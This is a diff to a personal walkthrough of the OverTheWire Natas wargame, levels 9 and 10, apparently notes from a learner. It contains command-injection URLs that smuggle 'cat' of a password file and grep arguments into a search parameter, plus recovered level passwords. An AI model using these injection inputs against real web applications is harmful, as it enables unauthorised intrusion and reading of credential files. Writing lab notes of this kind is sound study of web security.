@@ -52,3 +52,10 @@ Level 9:
 - Works with URL-Injection, in the starting Page of the nantes it says "All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5."
 - So I can access this file with http://natas9.natas.labs.overthewire.org/?needle=;%20cat%20/etc/natas_webpass/natas10
 - pw: "t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu"
+
+Level 10: 
+- Is the same problem as in lvl 9 but has a character check -->  if(preg_match('/[;|&]/',$key)) --> / is begin and end in php of regex,  [] is a array of the character --> banned are ; & |
+- Abuse the grep command --> ?needle= -E .%20 /../../etc/natas_webpass/natas11&submit=Search --> -E is the start of regex in grep and "." is any character 
+- pw: "UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk"
+
+
